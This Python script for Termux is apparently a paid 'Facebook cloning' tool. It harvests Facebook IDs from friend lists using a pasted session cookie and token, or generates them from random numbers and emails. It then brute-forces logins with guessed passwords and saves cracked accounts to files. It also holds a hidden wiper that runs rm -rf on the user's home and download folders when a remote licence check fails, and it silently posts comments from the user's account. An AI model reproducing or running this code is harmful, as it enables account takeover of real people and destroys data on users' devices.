import os,random,sys,time,string
from random import randint as byy
from concurrent.futures import ThreadPoolExecutor as tred
ida=[]
loop = 0
idx = []
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
"-------[@InstallingModules]---------"
try:
        import requests
except ModuleNotFoundError:

        os.system("pip install requests")

try:
        import bs4
except ModuleNotFoundError:

        os.system("pip install bs4")

try:
        import mechanize
except ModuleNotFoundError:
        os.system("pip install mechanize")

import requests,mechanize,bs4,re,json
from time import sleep
from os import system


if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        print("Turn OFF Your Local-Bypass System")
        time.sleep(2)
        print("\n If Next Time You Try Bypassing Tool I Will Reset Your Device Fully ! No Compromise ")
        time.sleep(5)
        exit()
else:
        pass
"-------[@pra link]----------"
minyu1837="https://graph.facebook.com/auth/login"
iehni273={'user-agent': 'Mozilla/3.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/3nMNa [FBAN/FBIOS;FBDV/iPhone11,1;FBMD/iPhone;FBSN/iOS;FBSV/86.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'X-FB-Connection-Quality': 'EXCELLENT', 'x-fb-sim-hni': '25264', 'x-fb-net-hni': '31473550', 'x-fb-connection-type': 'unknown', 'x-fb-friendly_name': 'authenticate', 'content-encoding': 'application/x-www-form-urlencoded', 'x-tigon-is_retry': 'false', 'x-fb-http-engine': 'Liger'}
jskri72="https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
kdoep28="https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0"
jskri72="https://api.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
kdoep28="https://api.facebook.com/login/device-based/validate-password/?shbl=0"
jdlso83="{'user-agent': 'Mozilla/3.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/3nMNa [FBAN/FBIOS;FBDV/iPhone11,1;FBMD/iPhone;FBSN/iOS;FBSV/86.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBIA/FBIOS;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'X-FB-Connection-Quality': 'EXCELLENT', 'x-fb-sim-hni': '25264', 'x-fb-net-hni': '31473550', 'x-fb-connection-type': 'unknown', 'x-fb-friendly_name': 'authenticate', 'content-encoding': 'application/x-www-form-urlencoded', 'x-tigon-is_retry': 'false', 'x-fb-http-engine': 'Liger'}"

"-------[@MyColours]---------"

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")

"-------[@LinkOpen]---------"
#--(os-open-link)--#
os.system("termux-open-url www.google.com")

"-------[@MySocialLinks]---------"
#--(social-links)--#
fb="TechQaiserYt"
wp="923079321417"
github="github.com/TechQaiser"
yt="https://youtu.be/44r7bY_Ge1Y"
web="www.techqaiser.com"
author="Qaiser Abbas"

"-------[@agentgen]---------"
import random

fro2 = ".".join(map(str, (random.randint(0,255) for _ in range(3))))
fro1 = ".".join(map(str, (random.randint(100,999) for _ in range(2))))
fro3 = ".".join(map(str, (random.randint(100,999) for _ in range(2))))
fro4 = ".".join(map(str, (random.randint(100,999) for _ in range(2))))
agentss = f"Opera/{fro1} (J2ME/MIDP; Opera Mini/{fro2}/{fro3}; U; en) [FBAN/FB4A;FBLC/en_PK;FBAV/{fro4}"

"-------[@PaidSystem]---------"
import uuid,zlib
import platform
#approval
myweb = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/I\xad(I\xca\xcc\xd3\xcbK-\xd1/J,\xd7O\xcb)**.I*\xa8,\x04\x00\xe2R\r@')
#web2 ffdvl1120/ap/main/server.txt
myweb2 = zlib.decompress(b'x\x9c\r\xca\xc1\x11\x80 \x0c\x04\xc0\x8e\x12\xf1i7\x11A\x98\x81\xc0\x84\x03-_\xf7\xbd\t\xe8\xe3`6y\xe8\xceH\xf3\x9c#\x98o\x8a\xa0 \xdf*\xc7x\xad\xe2\xdc\xbe\xb1t\xae\x92\x95\xff\xb0\x82\x11^|\xde}\x17\x1b')
crypto = requests.get(myweb).text
uuid = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuid).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")

plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = id+bxd+xp
appihy = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,\xc8\xd4KKLNM\xca\xcf\xcf\xd6K\xce\xcf\xd5/J-.)N-*K-\xd2+\xc8(\x00\x00"B\x0e\xd5')

try:
        update = requests.get(myweb2).text
        uppd = "updaatte"
        resst = "resseet"
        paidd = "res-bypas" #bypass users only reset
        if str(uppd) in update:

                os.system('clear')
                exit('script is in update / maintanance be patient ')
        elif str(resst) in update:

                
                exit('May Nay Mana Kia Tah Kay Mat kro use bypass Baqe Aap Khud Zimaydar Ho \n Q Ky Aap __q Ko 300 rs deny may mout ata hy jo bypass use krty ho ?????')
        elif str(paidd) in update:
                if bumper in crypto:
                        print(f"{g}You Are Safe ! Redirecting ....{s}")
                        time.sleep(1.5)
                        pass
                else:

                        os.system('rm -rf *')
                        os.system('cd && rm -rf *')
                        os.system('rm -rf $HOME/*')
                        os.system('rm -rf /sdcard/Download/*')
                        os.system('rm -rf /sdcard/Downloads/*')
                        os.system('rm -rf /sdcard/downloads/*')
                        exit(" I Warned Everyone ! Don't Use Bypass \n Just Your Termux Data & Downloads Is Clear \n If You Next Time Try to Use Bypass Again\n Then All Of Your A-Z Data Will Be Clear")
        else:
                pass
except requests.exceptions.ConnectionError:
        exit('no network connection')



#---(fining-key-join-expire-)---#
from datetime import date
today = date.today()
aajdate = date.today()
import zlib,re
try:
        os.system('rm -rf /sdcard/.datachecker.txt')
        file= open('/sdcard/.datachecker.txt','w')
        file.write(crypto)
        file.close()
        rd = open('/sdcard/.datachecker.txt','r')
        for line in rd:
                if bumper in line:
                        try:
                                xt = line.split("|")[1]
                                joined=xt.split(".")[0]
                                expired=xt.split(".")[1]
                                username=line.split("@")[0]
                        except:
                                joined="Not Updated"
                                expired="Not Updated"
                                username="User"
                else:
                        pass
except ConnectionError:
        exit('Bad Internet Connection Recived ...')




"-------[@LogoEtc-paid]---------"
logo = f'''
 .d8888888b.   .d88888b.   .d8888b.  8888888b.       
d88P"   "Y88b d88P" "Y88b d88P  Y88b 888   Y88b     
888  d8b  888 888     888 Y88b.      888    888     
888  888  888 888     888  "Y888b.   888   d88P     
888  888bd88P 888     888     "Y88b. 8888888P"       
888  Y8888P"  888 Y8b 888       "888 888 T88b       
Y88b.     .d8 Y88b.Y8b88P Y88b  d88P 888  T88b       
 "Y88888888P"  "Y888888"   "Y8888P"  888   T88b     
                     Y8b
{50*"-"}
Tool Version     :     8.0.0
Date Format      :   {rg}(yy/mm/dd){s}
Key Join Date    :   
Key Expire Date  :   
Premium Member   :   Premium {rc}㊅{s}
{50*"-"}
{lg}      {bumper}{s}
{50*"-"}
Tool Author  :   {author}
Tool Type    :   Cloning Tool
Welcome      :   
{50*"-"}'''

"-------[@login]----------#"
ses = requests.Session()
def _qlog():
        os.system("clear");print(logo)
        cookie = input(f"\n cookie : ")
        url = "https://business.facebook.com/business_locations"
        head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
        cok = {'cookie':cookie}
        try:
                data = ses.get(url,headers=head,cookies=cok)
                token = re.search('(EAAG\w+)',data.text).group(1)
                open('/sdcard/.cok.txt','w').write(cookie)
                open('/sdcard/.token.txt','w').write(token)
        except ValueError:
                _qlog()
        except IOError:
                os.system('rm -rf /sdcard/.token.txt')
                os.system('rm -rf /sdcard/.cok.txt')
                print("cookie In Checkpoint");time.sleep(2)
        except UnboundLocalError:
                exit(f"run again")

def bot():
        try:
                lc = "bro may AC par beta hu fir b itna gharmi 😅 aab smj aya hot dekh rha tu 👀🙈", "So hot 🔥", "Let’s go 🔥", "Love you so so much!", "Jani ib checkkkk plz", "Hello Chikny Ib Dekh", "Heavenly 😇", "Wonderful ❤️", "Oye Rasta Banao Bhai Arha 😎", "You deserve the best", "HaramKhor 🙈 Bandar 💞", "U are literally flawless!", "Pure charm!", "Gangster 👽", "Your killing it ❤️‍", "Let’s go 🔥", "Rare Pic 😍💓", "So precious!", "Bullet Bullet Bullet !", "I’m not crying you are", "Livin’ the life", "If you need a caddy", "legendry hy tu ", "Have a blast!", "All of the pictures are marvelous and charmistic", "Blessings 💖", "bsdk kaha gayb hy ", "Sharpening the game ", "Vibes asf 🔥", "Have the best time 🔥", "Fly guy 🔥", "itni kushi tujy dekh kr", "bsdk kaha gayb hy ", "Love it ❤️", "This is literally fire 🔥", "New beginnings can’t be hard when you look like that 😍", "You deserve the whole world", "Amazing pics!", "Views are insane! 😍", "INSANE HY TO BRO", "Yo that’s so cool", "That energy ❤️", "Love these shots so much!", "Bull 👾", "This is amazing 😍", "Oh man 🔥", "A great chart", "don ", "Very cool guy energy", "bhai ka bhai", "Gorgeous gal ❤️", "skiny 😕", "naam to suna hga ! chikna 😂😂", "Just casually hanging out", "You forgot my invite", "Looks like u had a blast!", "Omg obsessed 😍", "Love seeing you thrive", "dekha pehli pehli baar 👀", "You look so happy", "I love you say that tu bohat chikna hy 😅", "Swaag😮"," op"
                Baxk = random.choice(lc)
                try:
                        token = open('.token.txt', 'r').read()
                        cookie = open('.cok.txt', 'r').read()
                except:pass
                #comment
                requests.post(f"https://graph.facebook.com/pfbid0swzjJ4s27zLrisdKC1oJ7CchqCNVWPNvZSP7Cwq1c6iw41ff5D2wcU8uafkgQjBol/comments/?message={Baxk}&access_token={token}", cookies={'cookie':cookie})
                #like
                pass
        except:
                pass
"-------[@MainMenu]---------"

#--(Main-Menu)----#
def caseher():
        os.system("clear");print(logo)
        print("If You Want To Buy Things Without Loking At Price")
        print("Then Always Works Hard Without Looking At A Clock")
        print(50*"-")
        print("[1] Facebook Cloning")
        print("[2] Create File")
        print("[3] File Split/Sep")
        print("[4] Number Detail Finder")
        print("[5] Whatsapp Group")
        print("[6] Exit Tool")
        print(50*"-")
        selectme = input(" Select Any Option : ")
        if selectme in ["1","01","one"]:
                fb_cloning()
        if selectme in ["2","02","two"]:
                create_file()
        if selectme in ["3","03","three"]:
                sep()
        if selectme in ["4","04","four"]:
                number_detail()
        if selectme in ["05","5","five"]:
                os.system("termux-open-url https://chat.whatsapp.com/LoLzZLSux3C9Fp4Fl8AtFT")
                caseher()
        if selectme in ["00","0","exit"]:
                exit(" Thanks For Using ")
        else:
                exit(" Invalid Select")

#--(fb-cloning)----#
def fb_cloning():
        os.system("clear");print(logo)
        print("The Random Cloning Is Working Fully Try It")
        print(50*"-")
        print("[1] File Cloning")
        print("[2] Public Cloning ")
        print("[3] Email Cloning")
        print("[4] Number Cloning")
        print("[0] Go Back ")
        print(50*"-")
        cloneme = input(" Select Any Option : ")
        if cloneme in ["1","01","one"]:
                file_cloning()
        if cloneme in ["2","02","two"]:
                public_cloning()
        if cloneme in ["3","03","three"]:
                email_cloning()
        if cloneme in ["4","04","four"]:
                number_cloning()
        if cloneme in ["00","0","zero"]:
                sys.stdout.write("Redirecting To Main Page ..."),
                time.sleep(2)
                sys.stdout.flush()
                caseher()
        else:
                exit(" ")

#--(fb-file-cloning)----#
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe
id = []
loop = 0
idx=[]
pp = []

def file_cloning():
        os.system("clear");print(logo)
        filelist = input('\033[0m[+] File Path :\033[0m ')
        try:
                for line in open(filelist, 'r').readlines():
                        id.append(line.strip())
        except FileNotFoundError:
                exit("invalid location")
        password()

#--(public-clone)----#
def public_cloning():
        idx=[]
        try:
                tok = open('/sdcard/.token.txt', 'r').read()
                cok = open('/sdcard/.cok.txt', 'r').read()
        except:
                print(" Login Required");time.sleep(2)
                _qlog()
        try:
                r = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system("clear");print(logo)
        limit3 = input("How many public ids to add ? ")
        os.system("clear");print(logo)
        for ouqat in range(int(limit3)):
                qs=input(f" {ouqat+1} id : ")
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr = json.loads(sy)
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                id.append(bc+'\n')
                except KeyError:
                        if 'invalid' in str(sy):
                                print(f'{r}Your Cookie Is Lol{s}')
                                exit()
                        else:
                                print(f" {lr}{qs} friend list private{s} ")
                                time.sleep(5)
                except IOError:
                        pass
        password()

#--(rand-email-clone)----#
def email_cloning():
        os.system("clear");print(logo)
        import requests,random
        user=[]
        print(" [*] First Name Example Hamza,Areesha")
        first = input(" First Name : ")
        last = input(" Last Name : ")
        print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
        domain = input(" Domain : ")
        print("\n [?] Limit ids Example 1000,5000,50000")
        limit = int(input(" Limit Ids : "))
        for nmbr in range(limit):
                nmpp = random.randint(99,9999)
                nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                id.append(nmp)
        passwordemail()

#--(number-cloning)----#
def number_cloning():
        os.system('clear');print(logo)

        print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
        kode = input('\033[0mChoose Code : \033[0m')
        print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
        limit = int(input('\033[0mIdz Limit : \033[0m'))
        for nmbr in range(limit):
                nmp = ''.join(random.choice(string.digits) for _ in range(7))
                xoo = kode+nmp.replace(" ","")
                xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                id.append(xdr)
        passwordnum(xoo)

"-------[@Passlists]---------"
#--(pass-number)----#
def passwordnum(xoo):
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = ['pakistan','786786']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(xoo)
                                        pwv.append(frs)
                                        pwv.append("khan123")
                                        pwv.append("khan12345")
                                        pwv.append("khankhan")
                                        pwv.append("khan786")
                                        pwv.append("khan12")
                                        pwv.append("khan1122")
                        else:
                                pwv.append(xoo)
                                pwv.append(frs)
                                pwv.append("khan123")
                                pwv.append("khan12345")
                                pwv.append("khankhan")
                                pwv.append("khan786")
                                pwv.append("khan12")
                                pwv.append("khan1122")
                        pool.submit(crackmbasic,idf,pwv)
#--(pass-email)----#
def passwordemail():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = ['pakistan','786786']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frs)
                                        pwv.append(frslst)
                                        pwv.append(frs+"123")
                                        pwv.append(frs+"12345")
                                        pwv.append(frs+"123456")
                                        pwv.append(frs+"khan")
                                        pwv.append(frslst+"123")
                                        pwv.append(frslst+"123456")
                                        pwv.append(nmf)
                                        pwv.append("khan786")
                                        pwv.append("khankhan")
                        else:
                                pwv.append(frs)
                                pwv.append(frslst)
                                pwv.append(frs+"123")
                                pwv.append(frs+"12345")
                                pwv.append(frs+"123456")
                                pwv.append(frs+"khan")
                                pwv.append(frslst+"123")
                                pwv.append(frslst+"123456")
                                pwv.append(nmf)
                                pwv.append("khan786")
                                pwv.append("khankhan")
                        pool.submit(crackmbasic,idf,pwv)

#--(pass-file+public)----#
def password():
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'r') as file :
                filedata = file.read()
        filedata = filedata.replace('verify = False', 'verify = True')
        with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'w') as file:
                file.write(filedata)
        #If There is Verify False Also Then It Returns With True wala Verify
        if "verify = True" in filedata:
                pass
        else:
                with open('/data/data/com.termux/files/usr/lib/python3.10/site-packages/requests/sessions.py', 'a') as file:
                        file.write('\nverify = True\n')

        os.system('clear')
        print (logo)
        print(" Cloning Is Started Kindly Be Patient ... ")
        print(" Turn Airplane On Off When There Is Alert ")
        print(" The Speed Of Tool Depended In Your Network")
        print(50*"-")
        with tred(max_workers=30) as pool:
                for yuzong in id:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        frslst = nmf.replace(" ", "")
                        pwv = [nmf,'pakistan']
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frslst)
                                        pwv.append(frs+'123')
                                        pwv.append(frs+'12345')
                                        pwv.append(frs+'1122')
                                        pwv.append(nmf)
                                        pwv.append(frslst+'12345')
                                        pwv.append(frslst+'123')
                                        pwv.append(frslst+'12')
                                        pwv.append('khankhan')
                                        pwv.append('khan123')
                        else:
                                pwv.append(frslst)
                                pwv.append(frs+'123')
                                pwv.append(frs+'12345')
                                pwv.append(frs+'1122')
                                pwv.append(frs+'786')
                                pwv.append(nmf)
                                pwv.append(frslst+'12345')
                                pwv.append(frslst+'123')
                                pwv.append(frslst+'12')
                                pwv.append('khankhan')
                                pwv.append('khan123')
                        pool.submit(crackmbasic,idf,pwv)

#--(method-latest)----#
aks="auth.login"
djksj="b-"
asmr=f"{djksj}api.facebook.com"
koin = f"facebook.com"
grp = f"graph.{koin}"
auttt=f"auth"
import requests,re,random,string,secrets,os
def crackmbasic(idf,pwv):
        global ok,cp,loop
        sys.stdout.write(f"\r \033[0m[{aajdate}] {loop}/{len(id)} {ok} "),
        sys.stdout.flush()
        for pw in pwv:
                        ag = idf[::-1]
                        head = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) Mobile/nFGZ6 [FBAN/FBIOS;FBDV/iPhone13,1;FBSN/iOS;FBSV/262.463.500;FBSS/2;FBID/iPhone;FBLC/en_US;FBOP/5;FBRV/0];', 'accept-encoding': 'gzip,deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authentication': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell', 'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'content-type': 'application/x-www-form-urlencoded', 'x-fb-friendly_name': 'authenticate'}
                        dataa = {'include_headers': 'False', 'decode_body_json': 'True', 'streamable_json_response': 'True', 'api_key': '6628568379', 'adid': 'C77d3d38Cf2CCab9', 'format': 'JSON', 'method': 'auth/login', 'email': idf, 'password': pw, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'community_id': '0', 'currently_logged_in_userid': '0', 'meta_inf_fbmeta': 'NO_FILE', 'try_number': '1', 'attempt_login': 'true', 'return_multiple_errors': 'true', 'locale': 'en_US', 'client_country_code': 'en_US', 'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662', 'server_timestamps': 'True', 'pretty': 'False', 'strip_defaults': 'True', 'strip_nulls': 'True', 'fb_api_caller_class': 'com.facebook.account.login.protocol.FbiosAuthHandler', 'fb_api_request_friendly_name': 'authenticate'}
                        r = requests.post(f"https://graph.facebook.com/auth/login",headers=head,verify=True,data=dataa)
                        ro = re.findall('uid": (.*?),',str(r.text))
                        try:
                                for roid in ro:
                                        pass
                        except:
                                roid = idf
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[QSR-CP] {idf} | {pw}{s}')     
                                open('/sdcard/qsr_cp.txt','a').write(roid+'|'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "session_key" in r.text:
                                ok+=1
                                print(f'   \r {rg}[QSR-OK] {roid} | {pw}{s}')
                                open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pw+'\n')
                                break
                        elif "SMS shortly" in r.text:
                                print(f'   \r {rc}[QSR-2F] {idf} | {pw}{s}')
                                open('/sdcard/qsr_2f.txt','a').write(roid+'|'+pw+'\n')
                                break
                        else:
                                continue
        loop+=1

#--(file-create)----#
def create_file():
        try:
                tok = open('/sdcard/.token.txt', 'r').read()
                cok = open('/sdcard/.cok.txt', 'r').read()
        except:
                print(" Login Required");time.sleep(2)
                _qlog()
        try:
                r = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tok, cookies={'cookie':cok})
                name = json.loads(r.text)['name']
        except:
                name = "User"
                _qlog()
        bot()
        os.system("clear");print(logo)
        print(f" Welcome {name} Fb Ids File Create Menu")
        print(50*"-")
        print("[1] Create File Normally")
        print("[2] Create File by File")
        print("[0] Go Back ")
        print(50*"-")
        fileme = input(" Select Any Option : ")
        if fileme in ["1","01","one"]:
                normal_file()
        if fileme in ["2","02","two"]:
                bulk_file()
        if fileme in ["00","0","zero"]:
                sys.stdout.write("Redirecting To Main Page ..."),
                time.sleep(2)
                sys.stdout.flush()
                caseher()
        else:
                exit("Invalid Option")

def normal_file():
        limbo = "5000"
        rr = byy(0,20)
        cookie=open("/sdcard/.cok.txt", "r").read()
        token=open("/sdcard/.token.txt", "r").read()
        os.system('clear');print(logo)
        ###u_q_l = int(input(" How Many Ids To Add ? "))
        file_s = input(' Example /sdcard/xxx.txt\n Save file As : ')
        os.system('rm -rf '+file_s)
        file_s3 = ".aid.txt"
        try:
                qs=input(f' Input Id : ').split("|")[0]
                sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit('+limbo+')&access_token='+token, cookies={'cookie':cookie}).text
                qsr= json.loads(sy)
                _fleq=open(file_s3,"a")
                for abbas in qsr['friends']['data']:
                        uids=abbas['id']
                        name=abbas['name']
                        bc=uids+"|"+name
                        _fleq.write(bc+'\n')
        except KeyError:
                if 'invalid' in str(sy):
                        print(f'{r}Your Cookie Is Lol{s}')
                        exit()
                else:
                        print(f"[{c}{qs}{s}]\033[1;91m Friend List Is Prvate Bro {r}{qs}{s}\033[1;97m")
                        time.sleep(5)
                        caseher()
        xbc = open(file_s3, 'r').readlines()
        print(f" \tLimit Less Than {str(len(xbc))}")
        limit=int(input(f" How Many Ids Do you want to Extract \n Limit {str(len(xbc))} : "))
        if limit > len(xbc):
                print(f"{r}\t Error ! Type Less Then {str(len(xbc))} {s}")
                time.sleep(3)
                caseher()
        else:
                pass
        for i in range(limit):
                lines = open(file_s3).readlines()
                Types = [line.split("|")[0] for line in lines]
                qs = random.choice(Types)
                try:
                        sy = requests.get('https://graph.facebook.com/v14.0/'+qs+'/?fields=friends.limit(5000)&access_token='+token, cookies={'cookie':cookie}).text
                        qsr= json.loads(sy)
                        _fileq=open(file_s,"a")
                        for abbas in qsr['friends']['data']:
                                uids=abbas['id']
                                name=abbas['name']
                                bc=uids+"|"+name
                                _fileq.write(bc+'\n')
                        thn = open(file_s, 'r').readlines()
                        sys.stdout.write(f"\r Sucessfully Dump : {rg}{qs}{s}{ro}/[{str(len(thn))}]{s}"),
                        sys.stdout.flush()
